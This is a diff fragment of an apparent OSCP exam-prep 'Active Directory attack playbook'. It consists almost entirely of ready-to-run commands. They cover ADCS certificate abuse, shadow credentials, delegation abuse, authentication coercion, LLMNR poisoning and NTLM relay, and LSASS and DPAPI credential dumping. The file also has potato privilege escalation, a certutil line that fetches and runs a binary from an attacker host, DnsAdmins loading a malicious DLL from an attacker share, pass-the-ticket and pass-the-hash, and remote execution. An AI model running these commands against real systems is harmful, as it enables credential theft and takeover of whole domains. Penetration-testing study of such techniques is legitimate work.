-certipy auth -pfx targetuser.pfx -dc-ip $targetip
-
-
-
-======================================================================
-# A5 — ADCS ESC15 — TARGETED KERBEROASTING (Modern ADCS Misconfig)
-======================================================================
 
 # Detect ESC15-vulnerable certificate templates
 certipy find -u $user -p "$password" -dc-ip $targetip -vulnerable | grep -i ESC15
@@ -958,7 +272,353 @@ certipy req -u $user -p "$password" -dc-ip $targetip \
 # Authenticate using ESC15-derived Admin certificate
 certipy auth -pfx esc15.pfx -dc-ip $targetip
 
+======================================================================
+# 9. DELEGATION ATTACKS (RBCD / KCD)
+======================================================================
+
+# 9.1 Resource-Based Constrained Delegation (RBCD)
+addcomputer.py -dc-ip $targetip $domain/$user:"$password" -computer-name 'MACHINE$' -computer-pass 'Pass123!'
+impacket-rbcd -delegate-from 'MACHINE$' -delegate-to 'SERVER$' -dc-ip $targetip -action write -user $user -password "$password"
+getST.py -spn cifs/SERVER.$domain -impersonate Administrator "$domain/MACHINE$":"Pass123!"
+
+# 9.2 Kerberos Constrained Delegation (KCD)
+impacket-getST -impersonate Administrator -spn http/web.$domain $domain/$user:"$password"
+
+# 9.3 Coercion attacks (force authentication to attacker)
+printerbug.py $domain/$user:"$password"@$targetip $localip
+dfscoerce.py $domain/$user:"$password"@$targetip $localip
+petitpotam.py -u $user -p "$password" -d $domain -dc-ip $targetip $localip
+
+
+======================================================================
+# 10. NTLM RELAY (SMB → LDAP + ADCS)
+======================================================================
+
+# Poison LLMNR/NBNS traffic
+responder -I tun0 -wd -v
+
+# Relay to LDAP
+ntlmrelayx.py -t ldap://$targetip --no-http-server
+
+# ADCS relay to request certificates
+ntlmrelayx.py --adcs --template "User" -t http://$targetip --no-http-server
+
+# Block SMB to make relay more effective
+iptables -A INPUT -p tcp --dport 445 -j DROP
+
+
+======================================================================
+# 11. DPAPI Credential Extraction
+======================================================================
+
+# Extract DPAPI secrets from live system
+pypykatz live lsa
+
+# Extract Chrome saved passwords
+pypykatz dpapi chrome -d .
+
+# Extract RDP credentials
+pypykatz dpapi rdp -d .
+
+# Dump Wi-Fi stored passwords
+netsh wlan show profiles
+netsh wlan show profile name="<SSID>" key=clear
+
+
+======================================================================
+# 12. LSASS DUMPING
+======================================================================
+
+# Stealth LSASS dump
+nanodump.exe --write C:\Windows\Temp\lsass.dmp
+
+# LSASS dump using ProcDump
+procdump.exe -ma lsass.exe lsass.dmp
+
+# Parse LSASS dump for passwords, hashes, kerberos tickets
+pypykatz lsa minidump lsass.dmp
+
+
+======================================================================
+# 13. WINDOWS PRIVILEGE ESCALATION
+======================================================================
+
+# Check your privileges
+whoami /priv
+
+# PrintSpoofer exploit (service misconfig)
+PrintSpoofer.exe -i -c cmd
+
+# RoguePotato privilege escalation
+RoguePotato.exe
+
+# Search cleartext passwords on disk
+findstr /si /i "password" *.txt *.xml *.ini
+
+# Enumerate services for privilege escalation
+wmic service get name,displayname,pathname,startmode
+
+# WinPEAS full enumeration
+certutil -urlcache -f http://$localip/winpeas.exe C:\Temp\winpeas.exe && C:\Temp\winpeas.exe
+
+
+======================================================================
+# 14. CROSS-DOMAIN & FOREST ENUMERATION
+======================================================================
+
+# Enumerate all trust relationships
+nltest /domain_trusts
+nltest /trusted_domains
+
+======================================================================
+# 15. BLOODHOUND
+======================================================================
+
+# BloodHound collection (Python ingestor)
+# Gathers users, groups, ACLs, sessions, local admins, GPOs, trust paths
+bloodhound-python -d $domain -u $user -p "$password" -ns $targetip -c All
+
+
+======================================================================
+# 16. ADIDNS ENUMERATION & DNSADMINS PRIV-ESC (SAFE)
+======================================================================
+
+# Enumerate all DNS nodes (AD-integrated DNS records)
+ldapsearch -x -H ldap://$targetip -b "DC=DomainDnsZones,$basedn" "(objectClass=dnsNode)" name dnsRecord
+
+# List DNS zones (PowerShell)
+Get-DnsServerZone
+
+# List all DNS records for a zone
+Get-DnsServerResourceRecord -ZoneName $domain
+
+# DNS dump via Impacket
+dnsdump.py $domain/$user:"$password"@$targetip
+
+# Check DNSAdmins group membership
+ldapsearch -x -H ldap://$targetip -b "CN=DNSAdmins,CN=Users,$basedn" "(objectClass=*)" member
+netexec ldap $targetip --groups | grep -i dns
+Get-ADGroupMember "DNSAdmins"
+
+# Enumerate ACL of specific DNS nodes (to check for WriteDACL)
+Get-ACL "AD:\CN=www,CN=MicrosoftDNS,DC=DomainDnsZones,$basedn" | fl
+
+# 16.1 DNSADMINS ABUSE 
+# (Resolute-style DNS → SYSTEM on DC)
+
+# Configure DNS plugin DLL (malicious DLL hosted on SMB share)
+dnscmd $targetip /config /serverlevelplugindll \\$attacker\share\payload.dll
+
+# Restart DNS service to load the DLL
+sc.exe \\$targetip stop dns
+sc.exe \\$targetip start dns
+======================================================================
+# 17. DCSYNC & DCSHADOW ENUMERATION (NO EXPLOIT)
+======================================================================
+
+# List privileged groups whose members can DCSync
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(cn=Administrators)" member
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(cn=Domain Admins)" member
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(cn=Enterprise Admins)" member
+
+# Show groups & membership via NetExec
+netexec ldap $targetip --groups
+
+# Check your own token privileges
+whoami /groups
+
+# Check if domain object ACL contains DS-Replication privileges
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=domain)" nTSecurityDescriptor
+
+
+======================================================================
+# 18. ACL ABUSE ENUM (GenericAll / WriteDACL / WriteOwner)
+======================================================================
+
+# Dump ACL of any AD object
+ldapsearch -x -H ldap://$targetip -b "$dn" "(objectClass=*)" nTSecurityDescriptor
+Get-ObjectAcl -DistinguishedName "$dn" | fl
+
+# Domain-level ACL enumeration
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=domain)" nTSecurityDescriptor
+
+# Domain Controllers OU ACL enumeration
+ldapsearch -x -H ldap://$targetip -b "OU=Domain Controllers,$basedn" "(objectClass=*)" nTSecurityDescriptor
+
+# 18.1 SHADOW CREDENTIALS (KeyCredentialLink Abuse)
+# (Modern AD technique — works with WriteDACL/GenericWrite)
+
+# Enumerate KeyCredentialLink for all users
+ldapsearch -x -H ldap://$targetip -b "$basedn" \
+  "(objectClass=user)" sAMAccountName keyCredentialLink
+
+# Add Shadow Credential to a target user (creates cert-based auth)
+certipy shadow -u $user -p "$password" -account $targetuser -dc-ip $targetip
+
+# Authenticate using generated certificate (targetuser.pfx)
+certipy auth -pfx targetuser.pfx -dc-ip $targetip
+
+======================================================================
+# 19. LAPS ENUMERATION (LOCAL ADMIN PASSWORD SOLUTION)
+======================================================================
+
+# Enumerate machines storing LAPS passwords
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(ms-Mcs-AdmPwd=*)" name ms-Mcs-AdmPwdExpirationTime
+
+# Check who can read LAPS passwords
+Find-AdmPwdExtendedRights -ResolvePrincipals
+
+# Inspect ACLs on Computers container
+ldapsearch -x -H ldap://$targetip -b "CN=Computers,$basedn" "(objectClass=*)" nTSecurityDescriptor
+
+
+======================================================================
+# 20. BACKUP OPERATORS → SYSTEM → DA (SAFE ENUM)
+======================================================================
+
+# Enumerate Backup Operators group
+ldapsearch -x -H ldap://$targetip -b "CN=Backup Operators,CN=Builtin,$basedn" "(objectClass=*)" member
+Get-ADGroupMember "Backup Operators"
+
+# Check your privileges (look for SeBackupPrivilege / SeRestorePrivilege)
+whoami /priv
+
+# Local authentication test
+netexec smb $targetip -u $user -p "$password" --local-auth
+
+
+======================================================================
+# 21. AD MITM ATTACK SURFACE (RELAY ENUM)
+======================================================================
+
+# 21.1 SMB signing status
+netexec smb $targetip --signing
+nmap --script smb2-security-mode -p445 $targetip
+
+# 21.2 LDAP signing / channel binding
+netexec ldap $targetip --signing
+nmap -p389 --script ldap-rootdse $targetip
+
+# 21.3 LLMNR / NBNS exposure
+tcpdump -i tun0 "udp port 5355"   # LLMNR
+tcpdump -i tun0 "udp port 137"    # NBNS
+
+
+======================================================================
+# 22. PASSWORD POLICY & PASSWORD ANALYTICS
+======================================================================
+
+# 22.1 Enumerate domain password policy
+GetADUsers.py $domain/$user:"$password" -dc-ip $targetip -all
+Get-ADDefaultDomainPasswordPolicy
+netexec ldap $targetip --pass-pol
+
+# 22.2 Fine-Grained Password Policies (FGPP)
+ldapsearch -x -H ldap://$targetip -b "CN=Password Settings Container,CN=System,$basedn" "(objectClass=*)" msDS-PasswordSettings
+Get-ADFineGrainedPasswordPolicy -Filter *
+
+# 22.3 Search for weak password patterns in cracked creds
+grep -Ei "(spring|summer|autumn|winter|202[0-5])" cracked_passwords.txt
+
+# Search for plaintext passwords in SYSVOL
+grep -R "password" /mnt/sysvol 2>/dev/null
+
+
+======================================================================
+# 00. HOW TO REQUEST / OBTAIN A .kirbi TICKET (OSCP-SAFE)
+======================================================================
+
+# Request a TGT (Kerberos login)
+impacket-getTGT $domain/$user:"$password"
+
+# Convert .ccache → .kirbi
+impacket-ticketConverter $user.ccache $user.kirbi
+
+# Kerberoasting requests produce .kirbi internally
+impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $dcip -request
+
+# Export your own Kerberos ticket from Linux
+klist -e
+cp /tmp/krb5cc_* myticket.ccache
+impacket-ticketConverter myticket.ccache myticket.kirbi
+
+# Extract tickets from LSASS dump (OSCP allowed)
+pypykatz lsa minidump lsass.dmp
+
+# Load Kerberos ticket for authentication
+impacket-ticketConverter ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+impacket-wmiexec -k -no-pass $domain/$user@$targetip
+impacket-smbclient -k -no-pass cifs/$targetip
+impacket-psexec -k -no-pass $domain/$user@$targetip
+
+
+======================================================================
+# 23. PASS-THE-TICKET (PtT) — SAFE & OSCP-LEGAL
+======================================================================
+
+# Convert .kirbi → .ccache
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# Load ticket
+export KRB5CCNAME=ticket.ccache
+
+# Use Kerberos authentication only (no NTLM)
+impacket-smbclient -k -no-pass cifs/$targetip
+impacket-wmiexec -k -no-pass $domain/$user@$targetip
+impacket-psexec -k -no-pass $domain/$user@$targetip
+
+
+======================================================================
+# 24. OVERPASS-THE-HASH (Pass-the-Key)
+======================================================================
+
+# Request Kerberos TGT using only NTLM hash
+impacket-getTGT $domain/$user -hashes <LM:NTLM>
+
+# Load ticket
+export KRB5CCNAME=$user.ccache
+
+# Kerberos access
+impacket-wmiexec -k -no-pass $domain/$user@$targetip
+impacket-smbclient -k -no-pass cifs/$targetip
+
+
+======================================================================
+# 25. DCOM LATERAL MOVEMENT
+======================================================================
+
+# Execute commands remotely using DCOM
+dcomexec.py $domain/$user:"$password"@$targetip
+
+
+======================================================================
+# 26. SHADOW COPY ENUMERATION (OSCP-SAFE)
+======================================================================
+
+# List Volume Shadow Copies
+vssadmin list shadows
+
+# List providers
+vssadmin list providers
+
+# List writers
+vssadmin list writers
+
+
+======================================================================
+# 27. GOLDEN & SILVER TICKET ENUM (SAFE)
+======================================================================
+
+# krbtgt account enumeration
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(sAMAccountName=krbtgt)"
+
+# Enumerate all SPNs (used for Silver Ticket targets)
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+
+# Check domain ACL for replication rights (Golden Ticket requirement)
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=domain)" nTSecurityDescriptor
 
 ######################################################################
-# END — EXTRA AD CONTENT FOR FULL COVERAGE (TJNull + LainKusanagi)
+# END — COMPLETE OSCP + AD ATTACK PLAYBOOK (2025 FINAL)
 ######################################################################
